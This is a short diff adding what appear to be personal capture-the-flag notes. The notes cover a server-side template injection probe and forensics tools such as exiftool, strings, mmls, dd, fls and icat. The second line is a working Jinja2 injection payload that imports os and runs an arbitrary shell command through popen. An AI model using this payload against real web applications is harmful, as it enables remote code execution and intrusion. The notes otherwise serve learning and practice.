@@ -1,0 +1,8 @@
+{{7*7}}                to check SSTI. if it is 49, SSTI avaiable
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}                      to check if you can bypass it. (change the id to whatever you want, just like linux command)
+exiftool          to see metadata (read/edit formal data tags) for Images, Audio, Video, PDFs.
+strings          binary extraction (embedded, raw text from binary data) for Any file, especially executables and binaries.
+mmls          show different partition
+dd if=<filename> of=<output file> bs=<block sizes> skip=<where to start> count=<size of the file you wanna partition>
+fls -r <file>               to show all dir within partition
+icat <file> <r number of the file u wanna download> > <file you wanna download from that Rnumber> 
